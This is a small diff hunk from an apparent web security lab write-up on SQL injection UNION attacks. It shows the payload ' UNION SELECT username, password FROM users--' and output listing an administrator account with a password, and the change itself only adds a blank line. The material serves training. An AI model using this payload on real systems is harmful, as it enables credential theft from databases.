@@ -31,6 +31,7 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 ```sql
 ' UNION SELECT username, password FROM users--
 ```
+
 ```text
 administrator
 vhjbgmjx58u8j4f36vbi
